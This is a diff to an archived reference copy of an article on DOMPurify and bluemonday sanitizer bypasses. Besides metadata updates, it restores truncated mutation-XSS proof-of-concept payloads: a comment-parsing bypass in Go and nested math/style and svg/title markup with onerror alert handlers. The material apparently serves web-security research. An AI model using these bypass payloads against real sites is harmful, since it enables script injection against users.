@@ -6,9 +6,9 @@ resource: "https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fix
 tags: [article, webseclist-reference, en, mizu-re, mutation-xss, sanitizer-bypass, dom-clobbering, parser-differential, xss, dom, javascript, fuzzing, owasp-a03-2021, owasp-a05-2021, owasp-a08-2021]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-10T15:33:07+00:00"
+  at: "2026-08-16T00:00:51+00:00"
 status: stable
-stale_after: 2027-08-10
+stale_after: 2027-08-16
 sources:
   - id: original
     resource: "https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes"
@@ -21,7 +21,7 @@ canonical_url: ""
 cited_by:
   - "2024.md:9"
 commit: ""
-content_sha256: 799614efb2753c773272349f61d247ce17577427601b02de36bb28d34a62ce70
+content_sha256: 1eba2d753c6984d995765c2a77946663c513c72fad406bff06deb124d82240c1
 depth: full
 depth_reason: default
 kind: article
@@ -33,8 +33,8 @@ publisher: mizu.re
 publisher_english: ""
 raw_sha256: 330bfe4840982344a113610aeef3c30830f623008b384d465775363d1ced534a
 retrieved_from: "https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes"
-retrieved_kind: live
-retrieved_utc: "2026-08-10T15:33:07+00:00"
+retrieved_kind: stored
+retrieved_utc: "2026-08-16T00:00:51+00:00"
 slug: mizu-re-exploring-dompurify-library-bypasses-fixes-1-2
 snapshot: ""
 title_english: ""
@@ -48,7 +48,7 @@ translation_of: ""
 
 - Published: date not stated
 - Original: <https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes>
-- Preserved from: https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes (live) on 2026-08-10
+- Preserved from: https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes (stored) on 2026-08-16
 - Licence: unknown
 
 Rights remain with the original author and publisher. This is a research
@@ -125,11 +125,11 @@ import (
 )
 
 func main() {
-    unsafeHTML := `<!--><img src=x
+    unsafeHTML := `<!--><img src=x onerror=alert()>>`
     p := bluemonday.NewPolicy()
     p.AllowComments()
     safeHTML := p.Sanitize(unsafeHTML)
-    fmt.Println("Sanitized HTML:", safeHTML) // <!--><img src=x
+    fmt.Println("Sanitized HTML:", safeHTML) // <!--><img src=x onerror=alert()>-->
 }
 ```
 
@@ -672,7 +672,7 @@ ${"<form><h1></form><table><form></form></table></form></table></h1></form>".rep
 <math>
     <mi>
         <style><!--</style>
-        <style id="--></style></mi></math><img src='x' >"></style>
+        <style id="--></style></mi></math><img src='x' onerror='alert(1)'>"></style>
     </mi>
 </math>
 `;
@@ -703,7 +703,7 @@ ${"<form><h1></form><table><form></form></table></form></table></h1></form>\n".r
                         </desc>
                     </a>
                 </image>
-                <title><a id="</title><img src=x
+                <title><a id="</title><img src=x onerror=alert(1)>"></a></title>
             </svg>
         </desc>
     </svg>
